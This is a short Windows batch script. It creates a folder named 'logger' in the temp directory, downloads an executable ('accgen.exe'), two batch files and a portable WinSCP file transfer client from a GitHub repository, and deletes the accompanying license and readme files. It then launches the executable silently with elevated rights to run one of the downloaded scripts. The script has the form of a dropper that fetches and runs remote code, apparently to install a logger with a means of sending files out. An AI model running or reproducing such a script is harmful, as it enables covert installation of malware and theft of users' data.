@echo on
mkdir %temp%\logger
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile %temp%\logger\accgen.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile %temp%\logger\define.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile %temp%\logger\gen.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile %temp%\logger\scp.zip
powershell Expand-Archive scp.zip -DestinationPath %temp%\logger\
del /Q %temp%\logger\license.txt
del /Q %temp%\logger\readme.txt
del /Q %temp%\logger\scp.zip

:start
%temp%\logger\accgen.exe /NOCONSOLE /RUNAS %temp%\logger\define.bat